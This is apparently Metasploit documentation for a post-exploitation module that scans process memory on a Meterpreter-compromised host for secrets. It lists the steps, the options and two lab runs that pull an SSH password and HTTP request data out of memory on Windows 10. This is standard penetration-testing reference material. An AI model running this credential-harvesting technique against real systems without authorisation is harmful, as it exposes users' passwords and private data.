## Vulnerable Application

This module allows for searching the memory space of running processes using Meterpreter's
`stdapi_sys_process_memory_search` command for potentially sensitive data such as passwords.

## Verification Steps

1. Start `msfconsole`
1. Get a Meterpreter session
1. Do: `use post/multi/gather/memory_search`
1. Do: `set SESSION <Session ID>`
1. Do: `set PROCESS_NAMES_GLOB <process_names_regex>`
1. Do: `set PROCESS_IDS <Process ID>`
1. Do: `set REGEX <regex>`
1. Do: `run`

## Options

### PROCESS_NAMES_GLOB

Regular expression used to target processes. (default: `ssh.*`)

### PROCESS_IDS

Comma delimited process ID/IDs to search through. (default: `nil`)

### REGEX

Regular expression to search for within memory. (default: `publickey,password.*`)

### MIN_MATCH_LEN

The minimum number of bytes to match. (default: `5`)

### MAX_MATCH_LEN

The maximum number of bytes to match. (default: `127`)

### REPLACE_NON_PRINTABLE_BYTES

Replace non-printable bytes with ".". (default: `true`)

### SAVE_LOOT

Save the memory matches to loot. (default: `true`)


## Scenarios

### Windows 10 - OpenSSH_9.4p1, OpenSSL 3.1.2 1 Aug 2023

In this scenario, the Windows target is connected to a different host using `ssh.exe` using the password `myverysecretpassword`:
```
msf6 post(multi/gather/memory_search) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  3         meterpreter x64/windows  DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB  192.168.112.1:4444 -> 192.168.112.129:55513 (192.168.112.129)

msf6 post(multi/gather/memory_search) > run session=-1 regex="publickey,password.*" process_ids='' process_names_glob="ssh.*"

[*] Running module against - DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB (192.168.112.129). This might take a few seconds...
[*] Getting target processes...
[*] Running against the following processes:
        ssh.exe (pid: 4292)

[*] Memory Matches for ssh.exe (pid: 4292)
======================================

 Match Address       Match Length  Match Buffer                                                                                    Memory Region Start  Memory Region Size
 -------------       ------------  ------------                                                                                    -------------------  ------------------
 0x0000000A00060DF0  127           "publickey,password......3.......myverysecretpassword....................#.........#..........  0x0000000A00000000   0x0000000000090000
                                   ...........S......................"

[*] Post module execution completed
```

### Windows 10 - Python3 HTTP Server

In this scenario, the Windows target is running the `http.server` module in Python:
```
msf6 post(multi/gather/memory_search) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  3         meterpreter x64/windows  DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB  192.168.112.1:4444 -> 192.168.112.129:55513 (192.168.112.129)
  
msf6 post(multi/gather/memory_search) > run session=-1 regex="GET /.*" process_ids='' process_names_glob="python.*|[Ww]indows[Tt]erminal.*"

[*] Running module against - DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB (192.168.112.129). This might take a few seconds...
[*] Getting target processes...
[*] Running against the following processes:
        WindowsTerminal.exe (pid: 9168)
        python.exe (pid: 2816)

[*] Memory Matches for WindowsTerminal.exe (pid: 9168)
==================================================

 Match Address       Match Length  Match Buffer                                                                                    Memory Region Start  Memory Region Size
 -------------       ------------  ------------                                                                                    -------------------  ------------------
 0x00000121C3458649  127           "GET /.portable HTTP/1.1\" 200 -...::ffff:192.168.112.1 - - [17/Jan/2024 14:36:38] \"GET /favi  0x00000121C3449000   0x000000000001B000
                                   con.ico HTTP/1.1\" 404 -..windows-ter"

[*] Memory Matches for python.exe (pid: 2816)
=========================================

 Match Address       Match Length  Match Buffer                                                                                    Memory Region Start  Memory Region Size
 -------------       ------------  ------------                                                                                    -------------------  ------------------
 0x0000013A0E3017D1  127           "GET /.portable HTTP/1.1\" 200 -.....:.....Q.:...................0.Q.:...0.Q.:.....Q.:.....Q.:  0x0000013A0E270000   0x00000000000FF000
                                   ...pAR.:...pAR.:...0.Q.:...0.Q.:..."
 0x0000013A1063DC21  127           "GET /.portable HTTP/1.1\" 200 -...t-black.ico...`@l.:.....h.:..............&.............l.&.  0x0000013A105E0000   0x0000000000100000
                                   ....l.&.....l.&.....l.&......k.:..."
 0x0000013A1063E5B1  127           "GET /.portable HTTP/1.1\" 200 -...b.l.e...o.....P.c.:...s.e.r.s.\\.w.i.n.1.0.\\.s.c.o.o.p.\\.  0x0000013A105E0000   0x0000000000100000
                                   a.p.p.s.\\.w.i.n.d.o.w.s.-.t.e.r.m.i.n."
 0x0000013A1067EC41  127           "GET /Images/ HTTP/1.1\" 200 -...@.g.:...p..&....2.................012345........<li><a href=\  0x0000013A105E0000   0x0000000000100000
                                   "defaults.json\">defaults.json</a></l"
 0x0000013A106CADD0  127           "GET /.portable HTTP/1.1...p&.............x..:...P...:...0.l.:....ta$.e$j..k.:... lk.:........  0x0000013A105E0000   0x0000000000100000
                                   ...0.l.:......................&..."
 0x0000013A106CF940  127           "GET /.portable HTTP/1.1...........l.:...................Pf.&.....^.&......e.:................  0x0000013A105E0000   0x0000000000100000
                                   ....Sn&....s.......P.l.:...p..&..."

[*] Post module execution completed
```
